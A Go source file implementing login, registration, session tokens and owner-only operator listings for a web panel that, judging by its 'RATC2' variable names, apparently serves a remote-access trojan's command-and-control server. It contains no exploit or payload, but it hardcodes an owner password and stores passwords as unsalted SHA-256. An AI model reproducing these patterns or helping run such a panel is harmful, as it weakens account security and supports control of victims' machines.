package api

import (
	"crypto/sha256"
	"crypto/subtle"
	"encoding/hex"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
)

const (
	operatorUser = "chemical"
	operatorPass = "K7mP9xQ2wL4nR8vT3yB6cF1hJ5sD0gA9uE2iO4zX"
)

type operatorRow struct {
	ID        string  `db:"id" json:"id"`
	Username  string  `db:"username" json:"username"`
	Password  string  `db:"password" json:"-"`
	Email     string  `db:"email" json:"email"`
	CreatedAt string  `db:"created_at" json:"created_at"`
	LastLogin *string `db:"last_login" json:"last_login,omitempty"`
	LastIP    string  `db:"last_ip" json:"last_ip,omitempty"`
}

type operatorPublic struct {
	ID        string  `json:"id"`
	Username  string  `json:"username"`
	Email     string  `json:"email"`
	Role      string  `json:"role"`
	CreatedAt string  `json:"created_at"`
	LastLogin *string `json:"last_login,omitempty"`
	LastIP    string  `json:"last_ip,omitempty"`
}

var (
	tokenMu sync.Mutex
	tokens  = map[string]string{} // token -> username
)

func hashPass(p string) string {
	s := sha256.Sum256([]byte(p))
	return hex.EncodeToString(s[:])
}

func ownerUser() string {
	if v := strings.TrimSpace(os.Getenv("RATC2_OPERATOR_USER")); v != "" {
		return v
	}
	return operatorUser
}

func ownerPass() string {
	if v := strings.TrimSpace(os.Getenv("RATC2_OPERATOR_PASS")); v != "" {
		return v
	}
	return operatorPass
}

func ensureAuthTables() {
	if db == nil {
		return
	}
	_, _ = db.Exec(`
		CREATE TABLE IF NOT EXISTS operators (
			id TEXT PRIMARY KEY,
			username TEXT UNIQUE NOT NULL,
			password TEXT NOT NULL,
			email TEXT,
			created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
			last_login DATETIME,
			last_ip TEXT
		)`)
	_, _ = db.Exec(`ALTER TABLE operators ADD COLUMN last_login DATETIME`)
	_, _ = db.Exec(`ALTER TABLE operators ADD COLUMN last_ip TEXT`)
	_, _ = db.Exec(`
		CREATE TABLE IF NOT EXISTS sessions (
			token TEXT PRIMARY KEY,
			username TEXT NOT NULL,
			created_at DATETIME DEFAULT CURRENT_TIMESTAMP
		)`)
}

func issueToken(username string) string {
	t := uuid.New().String()
	tokenMu.Lock()
	tokens[t] = username
	tokenMu.Unlock()
	if db != nil {
		ensureAuthTables()
		_, _ = db.Exec(`INSERT INTO sessions (token, username, created_at) VALUES (?, ?, ?)`, t, username, time.Now())
	}
	return t
}

func lookupToken(tok string) (string, bool) {
	if tok == "" {
		return "", false
	}
	tokenMu.Lock()
	u, ok := tokens[tok]
	tokenMu.Unlock()
	if ok {
		return u, true
	}
	if db == nil {
		return "", false
	}
	ensureAuthTables()
	var username string
	if err := db.Get(&username, `SELECT username FROM sessions WHERE token = ?`, tok); err != nil {
		return "", false
	}
	tokenMu.Lock()
	tokens[tok] = username
	tokenMu.Unlock()
	return username, true
}

func bearerUser(c *gin.Context) string {
	h := c.GetHeader("Authorization")
	h = strings.TrimSpace(strings.TrimPrefix(h, "Bearer "))
	u, ok := lookupToken(h)
	if !ok {
		return ""
	}
	return u
}

func isOwnerName(u string) bool {
	return strings.EqualFold(strings.TrimSpace(u), ownerUser())
}

func requireOwner(c *gin.Context) bool {
	if isOwnerName(bearerUser(c)) {
		return true
	}
	c.JSON(http.StatusForbidden, gin.H{"error": "owner only"})
	return false
}

func lookupOperator(username string) (operatorRow, bool) {
	ensureAuthTables()
	if db == nil {
		return operatorRow{}, false
	}
	var row operatorRow
	err := db.Get(&row, `SELECT id, username, password, COALESCE(email,'') as email, created_at, last_login, COALESCE(last_ip,'') as last_ip FROM operators WHERE username = ?`, username)
	return row, err == nil
}

func touchLogin(username, ip string) {
	if db == nil {
		return
	}
	now := time.Now()
	_, _ = db.Exec(`UPDATE operators SET last_login = ?, last_ip = ? WHERE username = ?`, now, ip, username)
}

func loginHandler(c *gin.Context) {
	var req struct {
		Username string `json:"username" binding:"required"`
		Password string `json:"password" binding:"required"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	u := strings.TrimSpace(req.Username)
	p := req.Password
	role := "operator"
	ok := false
	if isOwnerName(u) {
		want := []byte(ownerPass())
		got := []byte(p)
		if len(got) == len(want) && subtle.ConstantTimeCompare(got, want) == 1 {
			ok = true
			role = "owner"
			u = ownerUser()
		}
	}
	if !ok {
		if row, found := lookupOperator(u); found && row.Password == hashPass(p) {
			ok = true
			u = row.Username
			touchLogin(u, c.ClientIP())
		}
	}
	if !ok {
		c.JSON(http.StatusUnauthorized, gin.H{"error": "Invalid credentials"})
		return
	}
	c.JSON(http.StatusOK, gin.H{
		"token": issueToken(u),
		"user":  gin.H{"username": u, "role": role},
	})
}

func registerHandler(c *gin.Context) {
	var req struct {
		Username string `json:"username" binding:"required"`
		Password string `json:"password" binding:"required"`
		Email    string `json:"email"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	u := strings.TrimSpace(req.Username)
	if len(u) < 3 || len(req.Password) < 8 {
		c.JSON(http.StatusBadRequest, gin.H{"error": "username >= 3 chars, password >= 8"})
		return
	}
	if strings.EqualFold(u, "admin") || isOwnerName(u) {
		c.JSON(http.StatusConflict, gin.H{"error": "username taken"})
		return
	}
	ensureAuthTables()
	if db == nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "no database"})
		return
	}
	id := uuid.New().String()
	now := time.Now()
	ip := c.ClientIP()
	_, err := db.Exec(`INSERT INTO operators (id, username, password, email, created_at, last_login, last_ip) VALUES (?, ?, ?, ?, ?, ?, ?)`,
		id, u, hashPass(req.Password), strings.TrimSpace(req.Email), now, now, ip)
	if err != nil {
		c.JSON(http.StatusConflict, gin.H{"error": "username taken"})
		return
	}
	c.JSON(http.StatusOK, gin.H{
		"token": issueToken(u),
		"user":  gin.H{"username": u, "email": req.Email, "role": "operator"},
	})
}

func meHandler(c *gin.Context) {
	u := bearerUser(c)
	if u == "" {
		c.JSON(http.StatusUnauthorized, gin.H{"error": "not logged in"})
		return
	}
	role := "operator"
	if isOwnerName(u) {
		role = "owner"
	}
	c.JSON(http.StatusOK, gin.H{"username": u, "role": role})
}

func listOperatorsHandler(c *gin.Context) {
	if !requireOwner(c) {
		return
	}
	ensureAuthTables()
	out := []operatorPublic{{
		ID:       "owner",
		Username: ownerUser(),
		Email:    "",
		Role:     "owner",
	}}
	if db != nil {
		var rows []operatorRow
		if err := db.Select(&rows, `SELECT id, username, COALESCE(email,'') as email, created_at, last_login, COALESCE(last_ip,'') as last_ip FROM operators ORDER BY created_at DESC`); err == nil {
			for _, r := range rows {
				out = append(out, operatorPublic{
					ID:        r.ID,
					Username:  r.Username,
					Email:     r.Email,
					Role:      "operator",
					CreatedAt: r.CreatedAt,
					LastLogin: r.LastLogin,
					LastIP:    r.LastIP,
				})
			}
		}
	}
	c.JSON(http.StatusOK, out)
}

func getOperatorHandler(c *gin.Context) {
	if !requireOwner(c) {
		return
	}
	id := c.Param("id")
	if id == "owner" || isOwnerName(id) {
		c.JSON(http.StatusOK, operatorPublic{
			ID:       "owner",
			Username: ownerUser(),
			Role:     "owner",
		})
		return
	}
	ensureAuthTables()
	if db == nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "not found"})
		return
	}
	var r operatorRow
	err := db.Get(&r, `SELECT id, username, COALESCE(email,'') as email, created_at, last_login, COALESCE(last_ip,'') as last_ip FROM operators WHERE id = ? OR username = ?`, id, id)
	if err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "not found"})
		return
	}
	c.JSON(http.StatusOK, operatorPublic{
		ID:        r.ID,
		Username:  r.Username,
		Email:     r.Email,
		Role:      "operator",
		CreatedAt: r.CreatedAt,
		LastLogin: r.LastLogin,
		LastIP:    r.LastIP,
	})
}
